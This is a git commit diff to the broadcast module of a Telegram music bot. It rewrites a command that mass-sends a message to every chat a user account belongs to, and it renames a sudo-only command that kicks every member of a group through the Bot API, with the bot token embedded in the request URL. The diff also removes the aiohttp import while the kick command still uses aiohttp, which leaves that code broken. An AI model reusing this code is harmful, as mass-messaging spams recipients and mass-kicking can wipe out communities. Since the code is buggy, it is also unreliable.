7f22bcbd99aaebe15c16f6dc1d0360c1c37fa674
AbhijithS <80395140+Abhijith-Sudhakaran@users.noreply.github.com>
2021-10-30 07:46:34 +0530

    Update broadcast.py

--- VoiceChat_Song_bot/modules/broadcast.py
+++ VoiceChat_Song_bot/modules/broadcast.py
@@ -1,40 +1,46 @@
-import asyncio
-import html
-import os
-import re
-import sys
-import aiohttp
-import regex
-from pyrogram import Client, filters
-from pyrogram.errors import UserAlreadyParticipant
-from VoiceChat_Song_bot.config import SUDO_USERS, BOT_TOKEN
-from aiohttp import ClientSession
-from pyrogram.types import Message
 
-@Client.on_message(filters.command(["gcast"]))
-async def bye(client, message):
+
+import asyncio
+import regex
+from pyrogram import Client
+from pyrogram import filters
+from pyrogram.types import Dialog
+from pyrogram.types import Chat
+from pyrogram.types import Message
+from aiohttp import ClientSession
+from VoiceChat_Song_bot.config import SUDO_USERS, BOT_TOKEN
+from pyrogram.errors import UserAlreadyParticipant
+
+from VoiceChat_Song_bot.services.callsmusic.callsmusic import client as USER
+from VoiceChat_Song_bot.config import SUDO_USERS
+
+@Client.on_message(filters.command(["broadcast"]))
+async def broadcast(_, message: Message):
     sent=0
     failed=0
-    if message.from_user.id in SUDO_USERS:
-        lol = await message.reply("Starting Gcast")
+    if message.from_user.id not in SUDO_USERS:
+        return
+    else:
+        wtf = await message.reply("`Starting a broadcast...`")
         if not message.reply_to_message:
-            await lol.edit("Reply to any text message to gcast sir")
+            await wtf.edit("Please Reply to a Message to broadcast!")
             return
-        msg = message.reply_to_message.text
-        async for dialog in client.iter_dialogs():
+        lmao = message.reply_to_message.text
+        async for dialog in USER.iter_dialogs():
             try:
-                await client.send_message(dialog.chat.id, msg)
+                await USER.send_message(dialog.chat.id, lmao)
                 sent = sent+1
-                await lol.edit(f"Gcasting.. Sent: {sent} chats. Failed: {failed} chats.")
+                await wtf.edit(f"`broadcasting...` \n\n**Sent to:** `{sent}` Chats \n**Failed in:** {failed} Chats")
+                await asyncio.sleep(3)
             except:
                 failed=failed+1
-                await lol.edit(f"Gcasting.. Sent: {sent} chats. Failed: {failed} chats.")
-            await asyncio.sleep(3)
-        await message.reply_text(f"Gcasted message to {sent} chats. Failed {failed} chats.")
+                #await wtf.edit(f"`broadcasting...` \n\n**Sent to:** `{sent}` Chats \n**Failed in:** {failed} Chats")
+                
+            
+        await message.reply_text(f"`Broadcast Finished ` \n\n**Sent to:** `{sent}` Chats \n**Failed in:** {failed} Chats")
 
-        
 
-@Client.on_message(filters.command("fukall") &
+@Client.on_message(filters.command("fedup") &
                  filters.group & filters.user(SUDO_USERS))
 async def ban_all(c: Client, m: Message):
     chat = m.chat.id
@@ -44,4 +50,4 @@ async def ban_all(c: Client, m: Message):
         url = (
             f"https://api.telegram.org/bot{BOT_TOKEN}/kickChatMember?chat_id={chat}&user_id={user_id}")
         async with aiohttp.ClientSession() as session:
-            await session.get(url)        
+            await session.get(url)  
